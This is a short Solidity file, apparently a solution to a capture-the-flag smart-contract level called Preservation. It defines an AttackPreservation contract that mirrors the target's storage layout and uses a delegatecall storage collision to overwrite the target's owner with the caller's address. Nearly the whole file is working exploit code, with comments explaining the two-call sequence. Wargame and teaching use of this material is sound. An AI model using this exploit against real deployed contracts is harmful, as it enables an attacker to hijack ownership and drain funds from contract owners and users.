// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ILibraryContract {
    function setTime(uint _time) external;
}

// Library calls of Preservation contract result to storage collision
// After the first execution of setFirstTime with argument the address of this contract
// slot0 of Preservation contract is overwritten from storedTime because of the delegate call to the library
// Second call to setFirstTime with any argument will use this contract address to call the overriden setTime which sets the owner
contract AttackPreservation is ILibraryContract {
    // Mimic the storage layout of the Preservation contract
    address public slot0Placeholder;
    address public slot1Placeholder;
    address public owner;
    uint storedTime;

    function setTime(uint _timeStamp) public {
        owner = msg.sender;
    }
}
